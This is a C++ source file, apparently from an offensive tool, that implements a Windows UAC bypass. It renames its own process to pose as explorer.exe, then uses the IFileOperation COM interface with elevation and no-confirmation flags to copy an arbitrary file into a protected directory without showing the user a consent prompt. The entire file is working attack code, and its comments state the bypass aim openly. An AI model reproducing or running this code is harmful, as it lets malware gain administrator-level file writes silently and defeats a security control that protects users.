#include <format>
#include <iostream>
#include <atlbase.h>
#include "filecop.h"
#include "helpers.h"
#include "ShlObj_core.h"


bool FileCop(PCCH SourceFile, PCCH DestinationFile)
{
	// Rename the process to explorer.exe to bypass the UAC dialog box.
	constexpr auto EXECPATH = "c:\\Windows\\explorer.exe";
	if (!ProcessRename(EXECPATH)) {
		std::cout << std::format("[-] ProcessRename({})\n", EXECPATH);
		return false;
	}
	// Convert the source file path to WCHAR string 
	// for use in SHCreateItemFromParsingName().
	PWCHAR SourceFilePathW = StringAtoW(SourceFile, 0);
	if (!SourceFilePathW) {
		std::cout << std::format("[-] StringAtoW({})\n", SourceFile);
		return false;
	}
	AutoHeapFree AHFSourceFilePathW(SourceFilePathW);

	// Extract the file name component from the source path 
	// for use in IFileOperation->CopyItem()
	PCWCH FileNameSrcW = PathFindFileNameW(SourceFilePathW);
	std::wcout << "[+] FileNameW=" << FileNameSrcW << '\n';

	// Convert the destination directory path to WCHAR string
    // for use in SHCreateItemFromParsingName().
	PWCHAR DestinationFilePathW = StringAtoW(DestinationFile, 0);
	if (!DestinationFilePathW) {
		std::cout << std::format("[-] StringAtoW({})\n", EXECPATH);
		return false;
	}
	AutoHeapFree AHFDestFilePathW(DestinationFilePathW);

	// Perform the thread specific initialization of COM.
	// COM object will only be accessed by a single thread (COINIT_APARTMENTTHREADED).
	ComInitializer comInit(COINIT_APARTMENTTHREADED);
	if (FAILED(comInit.result())) {
		std::cout << std::format("[-] CoInitializeEx() HRESULT=0x{:X}\n",
			comInit.result());
		return false;
	}
	auto hr = E_FAIL;
	CComPtr<IFileOperation> pFo;
	CComPtr<IShellItem> pShFrom;
	CComPtr<IShellItem> pShTo;
	// Instantiate the COM Object IFileOperation CLSID {3ad05575-8857-4850-9277-11b85bdb8e09}
	// This class ID is defined in the header file ShObjIdl_core.h
	// The following methods from this COM object are used :
	//  -SetOperationFlags(), CopyItem(), PerformOperations()
	hr = CoCreateInstance(CLSID_FileOperation, nullptr, CLSCTX_ALL, IID_PPV_ARGS(&pFo));
	if (FAILED(hr)) {
		std::cout << std::format("[-] CoCreateInstance() HRESULT=0x{:X}\n", hr);
		return false;
	}
	std::cout << "[+] CoCreateInstance() OK\n";
	// Step #1 :
	// Set the appropriate flags in IFileOperation object instance
	// so that the UAC consent prompt is not displayed to the user 
	// and file is silently copied to the protected destination directory.
	// The default value of flags IFileOperation is FOF_ALLOWUNDO | FOF_NOCONFIRMMKDIR.
	ULONG flags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
	hr = pFo->SetOperationFlags(flags);
	if (FAILED(hr)) {
		std::cout << std::format("[-] SetOperationFlags(0x{:X}) HRESULT=0x{:X}\n", flags, hr);
		return false;
	}
	std::cout << std::format("[+] SetOperationFlags(0x{:X}) OK\n", flags);

	// Create an instance of the IShellItem interface for the source file path.
	hr = SHCreateItemFromParsingName(SourceFilePathW, nullptr , IID_PPV_ARGS(&pShFrom));
	if (FAILED(hr)) {
		std::cout << std::format("[-] SourceFilePathW() HRESULT=0x{:X}\n", hr);
		return false;
	}
	std::cout << "[+] SHCreateItemFromParsingName(From) OK\n";

	// Create an instance of the IShellItem interface for the destination directory path.
	hr = SHCreateItemFromParsingName(DestinationFilePathW, nullptr, IID_PPV_ARGS(&pShTo));
	if (FAILED(hr)) {
		std::cout << std::format("[-] DestinationFilePathW() HRESULT=0x{:X}\n",hr);
		return false;
	}
	std::cout << "[+] SHCreateItemFromParsingName(To) OK\n";

	// Queue the request to copy the file FileNameSrcW from psiFrom to psiTo.
	hr = pFo->CopyItem(pShFrom, pShTo, FileNameSrcW, nullptr);
	if (FAILED(hr)) {
		std::cout << std::format("[-] CopyItem() HRESULT=0x{:X}\n", hr);
		return false;
	}
	std::cout << "[+] CopyItem() OK\n";

	// Perform all the queued operations.
	hr = pFo->PerformOperations();
	if (FAILED(hr)) {
		std::cout << std::format("[-] PerformOperations() HRESULT=0x{:X}\n", hr);
		return false;
	}
	std::cout << "[+] PerformOperations() OK\n";
	std::cout << "[+] Done() OK\n";
	return true;
}
